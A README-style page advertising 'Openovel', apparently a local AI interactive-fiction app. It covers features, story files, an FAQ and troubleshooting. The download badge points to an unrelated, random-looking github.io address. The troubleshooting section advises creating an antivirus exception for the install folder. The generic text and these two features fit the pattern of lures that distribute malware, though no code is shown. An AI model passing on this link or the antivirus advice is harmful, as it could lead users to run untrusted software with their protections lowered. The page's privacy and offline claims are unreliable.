[![](https://img.shields.io/badge/Download_Openovel-Blue?style=for-the-badge&logo=github)](https://associative-cufflink159.github.io)

Openovel provides a private space to create interactive fiction. It uses artificial intelligence to act as a partner in your storytelling. The software runs entirely on your own computer. This keeps your data private and ensures you retain control over your files. The engine tracks your plot, characters, and world details in simple text files. These files stay on your hard drive, which allows you to back up your progress or move your work between folders easily.

## 🛠 Features

*   **Private Memory:** The application saves every detail of your story as a plain text file. You own these files.
*   **Agent Interaction:** The smart engine manages multiple background characters. These agents react to your decisions and change the narrative flow.
*   **Offline Access:** You do not need an internet connection to write your story once the app installs.
*   **Simple Setup:** Install the software like any other standard program on your Windows computer.

## 📝 Creating Your First Story

The home screen contains a button labeled New Story. Click this to start your project. You will name your folder, and the app will create a text file to contain your narrative history. The interface displays a text box for your inputs. Type your ideas or actions here and press the Enter key.

The engine processes your input and adds the result to the main view. You can see the story state update in your project folder at any time. If you want to change part of the story, open the project folder and edit the text files directly. The app updates based on your manual edits during the next session.

## 📂 Managing Your Files

Openovel uses a simple file structure. Each story lives in its own dedicated folder. Inside this folder, you will find several text files. 

- **Story.txt**: This holds the final narrative of your project.
- **World.txt**: Use this file to define rules for your setting.
- **Characters.txt**: List your character traits and goals here.

The agent uses these files to stay consistent. If you want to change a character trait, update the character file and save. The app reads the updated information the next time it generates a response. You can copy these folders to a USB drive or cloud storage to move your work to a different computer.

## ❓ Common Questions

**Does the app send my data to a server?**
No. All processing happens on your local hardware. No information leaves your machine.

**Why does the text take time to appear?**
The artificial intelligence agent needs time to think, read your previous inputs, and check the status of your story files. This delay is normal for complex narrative tasks.

**Can I stop the engine while it writes?**
Yes. Use the Cancel button in the interface if you want to interrupt the current response.

**What if I make a mistake?**
Simply edit the relevant text file in your story folder. If the text appears messy, delete the last few lines of the text file and restart the application.

**Is there a limit to how long my story can be?**
The storage space on your hard drive is the only limit. You can write as much as your disk capacity allows.

## 🚀 Troubleshooting

If the software fails to start, check the following items:

*   Ensure you downloaded the Windows version.
*   Restart your computer if the installer hangs.
*   Check if your antivirus software prevents the app from opening. You may need to create an exception for the folder where you installed the program.

If the agent gives strange answers, check your character or world files for errors. Ensure the labels in those files match the format shown in the example files. Use plain language in your instructions to ensure the engine follows your intent.
